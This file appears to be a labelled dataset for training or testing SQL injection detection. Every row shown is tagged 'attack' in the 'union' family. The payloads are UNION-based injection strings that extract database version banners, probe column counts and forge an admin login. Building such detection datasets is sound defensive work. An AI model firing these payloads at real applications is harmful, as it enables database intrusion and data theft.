label,payload,family
attack," select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select \,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",union
attack," select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 *\. union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select 1<@,version  (    )   -- 1",union
attack," select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",union
attack," select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  11<1# union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 union select @<@$,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select @||1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",union
attack," )   union select * from information_schema.tables,",union
attack," select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 union select @<@,version  (    )   -- 1",union
attack," select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",union
attack,UNION ALL SELECT,union
attack," select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select +!<@,version  (    )   -- 1",union
attack," select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",union
attack," select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",union
attack," select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 +\. union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 + @<@. union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or   (  $+  )    =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 +   (  \+  )   union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1. union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \.<1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or $+<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1.  union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select @<@.,version  (    )   -- 1",union
attack," select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select @ _,version  (    )   -- 1",union
attack," select * from users where id  =  1 +$ 1 union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' + @<@# union select 1,version  (    )   -- 1'",union
attack,union all select @@version--,union
attack," select * from users where id  =  '1' + $+*$ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select +\#,@@VERSION -- 1'",union
attack," select * from users where id  =  1. union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 union select 1 1a,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or $<\. union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' union select \.#,@@VERSION -- 1'",union
attack," select * from users where id  =  1 union select 1 $,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""  (   union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1 +$+ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select \.,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 +1<@ union select null,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or 1#""; union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""1 union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#"".  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or @#""{  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""; union select 'a',version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1 1$,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select \.%1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#""$ union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  1.&&@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 + @<@# union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1 + @<1# union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or \<   =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' or $<\ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or \.<$ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or 1#""1 union select null,version  (    )   -- 1",union
attack," select * from users where id  =  '1' union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 +   (  $+  )   union select null,@@VERSION -- 1",union
attack," select * from users where id  =  '1' union select +\,@@VERSION -- 1'",union
attack," select * from users where id  =  1 *$ . union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 or 1#""@ union select version  (    )  ,version  (    )   -- 1",union
attack,"1234 ' AND 1  =  0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",union
attack," select * from users where id  =  '1'<@$$ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 + @`\` union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""?  =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1`\`,version  (    )   -- 1",union
attack," select * from users where id  =  '1' +   (  \  )   union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or $ 1  =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  '1' <@._ union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  1 or @#""  (    =  1 union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or \.<$ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  1 or 1#""  (   union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select @ $$,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1<@.,version  (    )   -- 1",union
attack," select * from users where id  =  1 or 1#""@ union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 or $+<\ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1 or \.<\ union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  '1' *1 union select 1,banner from v$version where rownum  =  1 -- 1'",union
attack," select * from users where id  =  '1' or \<$ union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or 1#""1 union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' or   (  \  )    =  1 union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or   (  \+  )    =  1 union select 1,@@VERSION -- 1",union
attack," select * from users where id  =  1  <@. union select version  (    )  ,version  (    )   -- 1",union
attack," select * from users where id  =  '1' +   (  \.  )   union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 union select 1 $$,version  (    )   -- 1",union
attack," select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",union
attack," select * from users where id  =  '1' union select ""[""_,version  (    )   -- 1'",union
attack," select * from users where id  =  '1' or \<\. union select 1,@@VERSION -- 1'",union
attack," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",union
attack," select * from users where id  =  1 -@<@ union select null,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select 1a#,banner from v$version where rownum  =  1 -- 1",union
attack," select * from users where id  =  1.*\ union select null,@@VERSION -- 1",union
attack," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",union
attack," select * from users where id  =  1 union select !<@,version  (    )   -- 1",union
attack,"-4860'  )   as azyx where 6901  =  6901 union all select 6901,6901,6901,6901,6901#",union
attack,"1%'   )    )    union all select null,null,null,null,null#",union
attack,"-3794'  )   union all select 2485,2485,2485,2485,2485--",union
attack,"-6400   )    )    union all select 4650,4650,4650--",union
attack,"1'  )   where 9842  =  9842 union all select null,null,null,null,null,null,null,null#",union
attack,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",union
attack,"-4605""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--",union
attack,"-5139   )    )    union all select 3373,3373,3373,3373,3373,3373,3373,3373#",union
attack,"1""   )    )    union all select null,null,null,null,null,null,null,null#",union
attack,"1""   )    )    as lomw where 9257  =  9257 union all select null,null,null,null,null,null--",union
attack,"1'+  (  select syrz where 7699  =  7699 union all select null,null,null#",union
attack,"-5224'  )   where 1962  =  1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",union
attack,"1""   )    )     )   union all select null,null,null,null,null--",union
attack,"-3721'  )   union all select 9050,9050--",union
attack,"-7371'  )   union all select 4531,4531,4531#",union
attack,"-3596'  )   union all select 5349,5349,5349,5349,5349,5349#",union
attack,"-7813""   )    )    as yvyl where 5172  =  5172 union all select 5172,5172#",union
attack,"-9795  )   as wrgs where 5427  =  5427 union all select 5427,5427,5427,5427,5427,5427--",union
attack,"1'+  (  select 'rryx' where 1228  =  1228 union all select null,null,null,null,null,null,null,null,null#",union
attack,"1  )   as biup where 1414  =  1414 union all select null,null,null,null,null,null,null,null#",union
attack,"-5827""  )   as lskq where 7683  =  7683 union all select 7683,7683,7683,7683,7683#",union
attack,"-3697'   )    )     )   union all select 5180,5180,5180,5180,5180,5180,5180--",union
attack,"-9514   )    )    as xdkw where 4975  =  4975 union all select 4975,4975,4975,4975#",union
attack,"-1065   )    )    union all select 7437,7437,7437,7437,7437,7437,7437,7437--",union
attack,"1'  )   where 6672  =  6672 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-3391' union all select 2024,2024--",union
attack,"-3279"" union all select 8568,8568,8568,8568--",union
attack,-3598  )   union all select 2264#,union
attack,"-8982' in boolean mode  )   union all select 5367,5367,5367,5367,5367,5367#",union
attack,"1' where 7104  =  7104 union all select null,null,null,null,null,null,null#",union
attack,"-1184""   )    )     )   union all select 1482--",union
attack,"-6158""  )   union all select 3084,3084,3084,3084,3084,3084#",union
attack,"-9859""   )    )     )   union all select 6595,6595,6595,6595,6595,6595,6595#",union
attack,"-2319 union all select 5068,5068,5068#",union
attack,"-5859  )   as ernq where 8394  =  8394 union all select 8394,8394,8394--",union
attack,"-4076'   )    )    union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",union
attack,"-8950""   )    )    as uahs where 2113  =  2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",union
attack,"1' union all select null,null,null--",union
attack,"1  )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",union
attack,"1 union all select null,null,null,null,null,null,null#",union
attack,"1%'   )    )     )   union all select null,null,null,null#",union
attack,"-3933'   )    )     )   union all select 6198,6198,6198,6198,6198#",union
attack,"-3361   )    )    union all select 2827,2827,2827,2827#",union
attack,"-7635"" union all select 1284,1284,1284,1284,1284,1284#",union
attack,"-3349   )    )     )   union all select 6553,6553#",union
attack,"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"1%""   )    )    union all select null,null,null,null,null,null#",union
attack,"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",union
attack,"-8636""   )    )     )   union all select 1821,1821,1821,1821,1821,1821,1821,1821,1821,1821--",union
attack,"-6940'  )   union all select 3042,3042,3042,3042,3042#",union
attack,"1  )   as ghew where 6441  =  6441 union all select null,null--",union
attack,"-6514   )    )    as pbgg where 6841  =  6841 union all select 6841,6841,6841,6841--",union
attack,"-4056""   )    )     )   union all select 4363,4363,4363,4363,4363,4363,4363,4363#",union
attack,"-5207"" where 2050  =  2050 union all select 2050,2050,2050,2050,2050,2050,2050--",union
attack,"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",union
attack,"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",union
attack,"-5910%'   )    )     )   union all select 5184,5184,5184,5184,5184,5184,5184,5184,5184,5184--",union
attack,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",union
attack,-7940'  )   union all select 6024--,union
attack,"1""  )   where 2758  =  2758 union all select null,null,null,null,null,null,null--",union
attack,"1%""   )    )     )   union all select null#",union
attack,"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#",union
attack,"-9622' union all select 7208,7208,7208,7208#",union
attack,"-9958""  )   as jzvq where 3741  =  3741 union all select 3741,3741,3741#",union
attack,"-7794""  )   union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",union
attack,"1""  )   union all select null#",union
attack,"-3955%'   )    )    union all select 7999,7999,7999,7999,7999,7999,7999,7999,7999#",union
attack,"1  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"-4373'+  (  select 'rlht' where 2285  =  2285 union all select 2285,2285,2285#",union
attack,"-1891' in boolean mode  )   union all select 6680,6680,6680,6680,6680,6680,6680,6680#",union
attack,"1""   )    )    as frsd where 6475  =  6475 union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"1'  )   where 3262  =  3262 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-2027%""  )   union all select 2048,2048,2048,2048,2048,2048,2048,2048#",union
attack,"-3853""  )   where 4626  =  4626 union all select 4626,4626,4626--",union
attack,"1 union all select null,null,null,null,null,null,null,null,null--",union
attack,"-8349  )   union all select 8126,8126#",union
attack,"-7531'  )   union all select 3072,3072,3072,3072,3072,3072,3072--",union
attack,"-8490   )    )    union all select 6910,6910,6910,6910,6910,6910#",union
attack,"1   )    )     )   union all select null,null,null,null,null,null,null--",union
attack,"1"" union all select null,null,null,null--",union
attack,"1""   )    )     )   union all select null,null,null,null,null#",union
attack,"-8566""  )   as hnch where 3418  =  3418 union all select 3418,3418,3418,3418,3418,3418,3418#",union
attack,"-2248'+  (  select wuow where 4421  =  4421 union all select 4421,4421,4421,4421,4421,4421--",union
attack,"-1438 where 6759  =  6759 union all select 6759,6759#",union
attack,"-6388'+  (  select 'jqld' where 8600  =  8600 union all select 8600,8600#",union
attack,"1'||  (  select 'hvqw' from dual where 4423  =  4423 union all select null,null,null--",union
attack,"-6680""   )    )     )   union all select 2564,2564,2564,2564,2564,2564#",union
attack,"1""   )    )    as eglv where 7412  =  7412 union all select null#",union
attack,"-2314%'   )    )    union all select 4612,4612--",union
attack,"1'  )   where 8211  =  8211 union all select null,null,null,null,null#",union
attack,"-5891 union all select 7103,7103,7103,7103--",union
attack,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",union
attack,"-7267  )   union all select 1912,1912,1912,1912,1912,1912,1912,1912--",union
attack,"1'+  (  select 'idmr' where 5029  =  5029 union all select null,null,null,null,null,null--",union
attack,"1'+  (  select dklk where 9862  =  9862 union all select null,null,null,null,null,null--",union
attack,"-5520%"" union all select 5235,5235,5235,5235,5235,5235,5235,5235,5235,5235--",union
attack,"1  )   where 1443  =  1443 union all select null,null,null,null,null#",union
attack,"1   )    )     )   union all select null,null,null,null,null--",union
attack,"-4856' in boolean mode  )   union all select 1074,1074,1074,1074,1074,1074,1074#",union
attack,"-8080""  )   as nlos where 8917  =  8917 union all select 8917,8917,8917,8917--",union
attack,"-8902 union all select 4339,4339,4339#",union
attack,"1""  )   union all select null,null,null,null,null,null,null,null,null,null--",union
attack,"-4305   )    )     )   union all select 2401,2401--",union
attack,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",union
attack,1'   )    )    as vwua where 8099  =  8099 union all select null--,union
attack,"-7584' union all select 1132,1132,1132,1132,1132,1132,1132,1132,1132,1132#",union
attack,"-1244  )   as qszw where 2332  =  2332 union all select 2332,2332,2332,2332#",union
attack,"1""   )    )    as mlid where 1047  =  1047 union all select null,null#",union
attack,1' in boolean mode  )   union all select null--,union
attack,"-3071   )    )    as uiiu where 8910  =  8910 union all select 8910,8910,8910,8910,8910,8910,8910#",union
attack,"1'  )   where 1577  =  1577 union all select null,null,null,null,null,null#",union
attack,"-6632  )   union all select 4073,4073,4073,4073,4073,4073,4073,4073--",union
attack,-8513' union all select 7414--,union
attack,"-9039'  )   union all select 8058,8058,8058,8058,8058--",union
attack,"-7272""  )   union all select 9163,9163,9163,9163,9163,9163,9163--",union
attack,"-6597'+  (  select aewz where 4036  =  4036 union all select 4036,4036,4036,4036,4036,4036,4036--",union
attack,"-4031%"" union all select 9566--",union
attack,"-2394'  )   union all select 1650,1650,1650,1650,1650,1650,1650--",union
attack,"1'  )   union all select null,null,null,null,null,null#",union
attack,"1%""   )    )    union all select null,null,null,null--",union
attack,"-4085'+  (  select aipn where 5493  =  5493 union all select 5493,5493,5493,5493,5493,5493,5493#",union
attack,"-9532   )    )    union all select 6039,6039,6039,6039--",union
attack,"-5313'  )   union all select 7187,7187,7187#",union
attack,"-7858'  )   union all select 1541,1541,1541,1541,1541,1541#",union
attack,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",union
attack,"-2397   )    )    as oizy where 1746  =  1746 union all select 1746,1746,1746,1746,1746,1746#",union
attack,"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",union
attack,"-3364%""   )    )     )   union all select 5464--",union
attack,"-1171' union all select 3958,3958,3958,3958,3958--",union
attack,"-7001'+  (  select slav where 9321  =  9321 union all select 9321,9321,9321,9321,9321,9321,9321,9321,9321--",union
attack,"-9725'  )   union all select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",union
attack,"-2225' union all select 1545,1545,1545,1545#",union
attack,"1%' union all select null,null,null,null,null,null,null--",union
attack,"1%'  )   union all select null,null,null,null,null,null,null,null,null--",union
attack,"1'+  (  select rwse where 9843  =  9843 union all select null,null,null,null,null,null,null--",union
attack,"1'  )   as vpop where 2528  =  2528 union all select null,null,null,null,null,null,null#",union
attack,"1'||  (  select 'jbgg' from dual where 1986  =  1986 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"-6292  )   union all select 7499,7499,7499,7499,7499,7499,7499--",union
attack,"-8098%'  )   union all select 5697,5697,5697,5697,5697,5697,5697,5697,5697,5697#",union
attack,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",union
attack,"1'||  (  select 'zpwe' from dual where 7743  =  7743 union all select null,null#",union
attack,"1'+  (  select unzl where 3432  =  3432 union all select null,null,null,null--",union
attack,"1'+  (  select 'gqsk' where 3087  =  3087 union all select null,null,null,null--",union
attack,"-4571' union all select 3227,3227,3227,3227--",union
attack,"-5026' where 7324  =  7324 union all select 7324,7324--",union
attack,"1""   )    )    as isqj where 6344  =  6344 union all select null,null,null,null--",union
attack,"-8760"" union all select 2309,2309,2309,2309,2309,2309,2309,2309,2309#",union
attack,"-3595'+  (  select vppx where 6018  =  6018 union all select 6018,6018,6018,6018,6018#",union
attack,-8143  )   union all select 3014--,union
attack,"-3370""  )   union all select 7845,7845,7845,7845,7845,7845#",union
attack,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--",union
attack,"-7313""  )   where 3606  =  3606 union all select 3606#",union
attack,-2569' union all select 4484--,union
attack,"1%' union all select null,null,null,null,null#",union
attack,"1%'  )   union all select null,null,null,null,null,null#",union
attack,"-4535'  )   union all select 8491,8491,8491,8491,8491,8491--",union
attack,"-1684""   )    )     )   union all select 7473,7473#",union
attack,"-7683""  )   where 9664  =  9664 union all select 9664,9664,9664,9664,9664,9664,9664#",union
attack,"-1641'||  (  select 'jfnu' where 7682  =  7682 union all select 7682,7682,7682--",union
attack,"1   )    )    as bwrg where 3254  =  3254 union all select null,null,null,null,null,null--",union
attack,"1%' union all select null,null,null,null,null,null,null,null,null--",union
attack,"-3885  )   where 2387  =  2387 union all select 2387,2387,2387,2387,2387,2387,2387#",union
attack,"1""   )    )    as hwlh where 1071  =  1071 union all select null,null,null,null,null,null,null,null#",union
